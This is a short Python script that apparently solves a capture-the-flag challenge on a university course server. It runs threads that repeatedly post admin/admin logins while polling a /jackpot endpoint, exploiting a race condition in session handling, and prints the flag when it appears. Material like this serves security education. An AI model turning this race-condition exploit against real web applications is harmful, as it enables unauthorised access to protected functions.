import requests
from concurrent.futures import ThreadPoolExecutor

session = requests.Session()

def jackpot():
    while True:
        data_l = {'username': 'admin', 'password': 'admin'}
        jackpot_res = session.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/jackpot", data=data_l)
        if 'SSof{' in jackpot_res.text:
            print(jackpot_res.text)

def login():
    while True:
        url = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/login'
        data_l = {'username': 'admin', 'password': 'admin'}
        session.post(url, data=data_l)

with ThreadPoolExecutor(max_workers=5) as tpe:
    tpe.submit(jackpot)
    tpe.submit(login)